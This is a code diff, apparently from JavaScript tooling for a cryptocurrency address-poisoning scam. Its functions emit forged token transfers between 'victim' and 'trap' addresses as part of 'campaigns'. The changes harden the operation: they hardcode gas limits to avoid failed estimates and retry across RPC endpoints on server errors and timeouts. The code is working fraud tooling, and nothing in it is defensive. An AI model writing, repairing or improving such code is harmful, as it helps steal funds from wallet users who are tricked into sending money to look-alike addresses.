@@ -1061,6 +1061,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           functionName: 'transferFrom',
           args: [victimAddress, trapAddress, rawValue],
           nonce: nonce,
+          gas: 100000n, // 🚀 FIX: Hardcode gas to bypass flaky eth_estimateGas on public RPCs
         });
 
         // Success! Break out of retry loop
@@ -1070,11 +1071,14 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         lastError = err;
         const errMsg = err.message || String(err);
 
-        // Check if this is a rate limit error - rotate to next RPC
-        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429')) {
-          logger.warn(`[mirror] RPC ${attempt + 1} rate limited, rotating to next RPC...`);
-          await new Promise(resolve => setTimeout(resolve, 1000)); // Brief pause before next attempt
-          continue; // Try next RPC
+        // Check if this is a retryable RPC error - rotate to next RPC
+        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429') ||
+          errMsg.includes('Internal error') || errMsg.includes('server error') ||
+          errMsg.includes('502') || errMsg.includes('503') || errMsg.includes('504') ||
+          errMsg.includes('Failed to fetch') || errMsg.includes('timeout')) {
+          logger.warn(`[mirror] RPC ${attempt + 1} failed (${errMsg.slice(0, 40)}), rotating...`);
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          continue;
         }
 
         // Non-rate-limit error, don't retry
@@ -1279,6 +1283,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
+          gas: BigInt(80000 + (40000 * froms.length)), // 🚀 FIX: Hardcode gas to bypass flaky eth_estimateGas
         });
 
         logger.info(`[batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
@@ -1287,8 +1292,11 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         lastError = err;
         const errMsg = err.message || String(err);
 
-        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429')) {
-          logger.warn(`[batch] RPC ${attempt + 1} rate limited, rotating to next RPC...`);
+        if (errMsg.includes('rate-limit') || errMsg.includes('capacity') || errMsg.includes('429') ||
+          errMsg.includes('Internal error') || errMsg.includes('server error') ||
+          errMsg.includes('502') || errMsg.includes('503') || errMsg.includes('504') ||
+          errMsg.includes('Failed to fetch') || errMsg.includes('timeout')) {
+          logger.warn(`[batch] RPC ${attempt + 1} failed (${errMsg.slice(0, 40)}), rotating...`);
           await new Promise(resolve => setTimeout(resolve, 1000));
           continue;
         }
